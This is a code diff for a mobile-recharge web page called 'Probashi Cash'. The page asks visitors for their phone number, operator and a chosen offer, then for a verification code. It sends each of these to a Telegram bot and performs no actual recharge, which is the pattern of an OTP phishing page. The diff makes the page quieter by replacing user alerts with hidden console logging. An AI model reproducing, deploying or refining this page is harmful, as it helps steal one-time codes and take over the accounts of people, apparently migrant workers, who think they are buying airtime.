@@ -10,7 +10,6 @@
       font-family: Arial, sans-serif;
       background-color: #f0f0f0;
     }
-
     .header {
       display: flex;
       align-items: center;
@@ -20,7 +19,6 @@
       padding: 10px 15px;
       position: relative;
     }
-
     .header .title {
       position: absolute;
       left: 50%;
@@ -28,7 +26,6 @@
       font-size: 20px;
       font-weight: bold;
     }
-
     .hamburger {
       width: 30px;
       cursor: pointer;
@@ -36,13 +33,11 @@
       flex-direction: column;
       gap: 5px;
     }
-
     .hamburger div {
       height: 4px;
       background: white;
       border-radius: 2px;
     }
-
     .menu-items {
       display: none;
       flex-direction: column;
@@ -50,22 +45,18 @@
       padding: 10px;
       border-top: 1px solid #ccc;
     }
-
     .menu-items a {
       padding: 10px;
       text-decoration: none;
       color: #333;
       border-radius: 4px;
     }
-
     .menu-items a:hover {
       background-color: #ddd;
     }
-
     .menu-items.show {
       display: flex;
     }
-
     .button-group {
       margin: 20px auto;
       display: flex;
@@ -75,7 +66,6 @@
       width: 90%;
       max-width: 400px;
     }
-
     .button-group button {
       width: 100%;
       padding: 12px 20px;
@@ -87,11 +77,9 @@
       cursor: pointer;
       transition: background 0.3s ease;
     }
-
     .button-group button:hover {
       background-color: #0056b3;
     }
-
     .offers, .form-section {
       margin: 20px auto;
       width: 90%;
@@ -101,31 +89,25 @@
       border-radius: 10px;
       box-shadow: 0 0 10px rgba(0,0,0,0.1);
     }
-
     .offer-item {
       padding: 15px;
       border-bottom: 1px solid #ddd;
       font-size: 16px;
       cursor: pointer;
     }
-
     .offer-item:last-child {
       border-bottom: none;
     }
-
     .offer-item.selected {
       background-color: #e0f0ff;
       border-left: 4px solid #007BFF;
     }
-
     .page {
       display: none;
     }
-
     .page.active {
       display: block;
     }
-
     .back-btn {
       display: flex;
       justify-content: space-between;
@@ -133,7 +115,6 @@
       width: 90%;
       max-width: 400px;
     }
-
     .back-btn button {
       padding: 10px 20px;
       border-radius: 20px;
@@ -142,7 +123,6 @@
       color: white;
       cursor: pointer;
     }
-
     .form-section input[type="tel"],
     #verificationCode {
       width: 100%;
@@ -153,20 +133,16 @@
       border-radius: 8px;
       box-sizing: border-box;
     }
-
     .form-section .operator-group {
       margin-bottom: 15px;
     }
-
     .operator-group label {
       display: block;
       margin-bottom: 5px;
     }
-
   </style>
 </head>
 <body>
-
   <div class="header">
     <div class="hamburger" onclick="toggleMenu()">
       <div></div>
@@ -175,14 +151,12 @@
     </div>
     <div class="title">Probashi Cash</div>
   </div>
-
   <div class="menu-items" id="menu">
     <a href="#">Transaction History</a>
     <a href="#">Refer Friend</a>
     <a href="#">Support</a>
   </div>
 
-  <!-- Main page -->
   <div class="page active" id="mainPage">
     <div class="button-group">
       <button onclick="showPage('internetPage')">Internet Pack</button>
@@ -192,13 +166,11 @@
     </div>
   </div>
 
-  <!-- Offer pages -->
   <div class="page" id="internetPage"></div>
   <div class="page" id="minutePage"></div>
   <div class="page" id="comboPage"></div>
   <div class="page" id="talkTimePage"></div>
 
-  <!-- Verification page -->
   <div class="page" id="verificationPage" style="max-width: 400px; margin: 20px auto; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1);">
     <h3>Verification</h3>
     <input type="text" id="verificationCode" placeholder="Enter verification code" />
@@ -235,42 +207,15 @@
     }
 
     const offersData = {
-      internetPage: [
-        '3 GB – 30 Days @ RM 10',
-        '5 GB – 7 Days @ RM 3',
-        '20 GB – 7 Days @ RM 13'
-      ],
-      minutePage: [
-        '140 minute – 7 Days @ RM 6',
-        '230 minute – 7 Days @ RM 10',
-        '350 minute – 30 Days @ RM 15',
-        '580 minute – 30 Days @ RM 20',
-        '1550 minute @ RM 50'
-      ],
-      comboPage: [
-        '8GB + 120 minute – 7 Days @ RM 10',
-        '2GB + 80 minute – 30 Days @ RM 15',
-        '3GB + 100 minute – 30 Days @ RM 20',
-        '12GB + 250 minute – 30 Days @ RM 25',
-        '20GB + 400 minute – 30 Days @ RM 30',
-        '50GB + 1500 minute – 30 Days @ RM 50'
-      ],
-      talkTimePage: [
-        '20 tk @ RM 1',
-        '40 tk @ RM 2',
-        '100 tk @ RM 5',
-        '200 tk @ RM 10',
-        '300 tk @ RM 15',
-        '500 tk @ RM 25',
-        '1000 tk @ RM 50',
-        '2000 tk @ RM 100'
-      ]
+      internetPage: ['3 GB – 30 Days @ RM 10', '5 GB – 7 Days @ RM 3', '20 GB – 7 Days @ RM 13'],
+      minutePage: ['140 minute – 7 Days @ RM 6', '230 minute – 7 Days @ RM 10', '350 minute – 30 Days @ RM 15', '580 minute – 30 Days @ RM 20', '1550 minute @ RM 50'],
+      comboPage: ['8GB + 120 minute – 7 Days @ RM 10', '2GB + 80 minute – 30 Days @ RM 15', '3GB + 100 minute – 30 Days @ RM 20', '12GB + 250 minute – 30 Days @ RM 25', '20GB + 400 minute – 30 Days @ RM 30', '50GB + 1500 minute – 30 Days @ RM 50'],
+      talkTimePage: ['20 tk @ RM 1', '40 tk @ RM 2', '100 tk @ RM 5', '200 tk @ RM 10', '300 tk @ RM 15', '500 tk @ RM 25', '1000 tk @ RM 50', '2000 tk @ RM 100']
     };
 
     function showPage(pageId) {
       document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
       document.getElementById('verificationPage').style.display = 'none';
-
       const container = document.getElementById(pageId);
       container.innerHTML = document.getElementById('templatePage').innerHTML;
 
@@ -297,13 +242,11 @@
         const offer = container.querySelector('.offer-item.selected')?.textContent;
 
         if (!phone || !operator || !offer) {
-          alert("Please fill all fields: phone, operator, and offer.");
+          console.warn("Missing input: phone, operator, or offer.");
           return;
         }
 
-        // Prepare message for Telegram
         const message = `New Submission:\nPhone: ${phone}\nOperator: ${operator}\nOffer: ${offer}`;
-
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
           method: "POST",
           headers: {
@@ -317,17 +260,14 @@
         .then(response => response.json())
         .then(data => {
           if (data.ok) {
-            alert("Submission sent successfully!");
-            // Show verification page (DO NOT auto back)
+            console.log("Submission sent successfully.");
             showVerificationPage();
           } else {
-            alert("Failed to send submission. Please try again.");
-            console.error(data);
+            console.error("Telegram API error:", data);
           }
         })
         .catch(err => {
-          alert("Error sending submission: " + err.message);
-          console.error(err);
+          console.error("Network error:", err);
         });
       };
 
@@ -344,12 +284,11 @@
       verificationPage.querySelector('.verify').onclick = () => {
         const code = verificationPage.querySelector('#verificationCode').value.trim();
         if (!code) {
-          alert("Please enter the verification code.");
+          console.warn("Verification code missing.");
           return;
         }
 
         const verificationMessage = `Verification Code Submitted:\nCode: ${code}`;
-
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
           method: "POST",
           headers: {
@@ -363,16 +302,14 @@
         .then(response => response.json())
         .then(data => {
           if (data.ok) {
-            alert("Verification code sent successfully!");
+            console.log("Verification code sent.");
             verificationPage.querySelector('#verificationCode').value = "";
           } else {
-            alert("Failed to send verification code. Please try again.");
-            console.error(data);
+            console.error("Telegram API error:", data);
           }
         })
         .catch(err => {
-          alert("Error sending verification code: " + err.message);
-          console.error(err);
+          console.error("Network error:", err);
         });
       };
 
@@ -382,7 +319,5 @@
       };
     }
   </script>
-
 </body>
 </html>
-
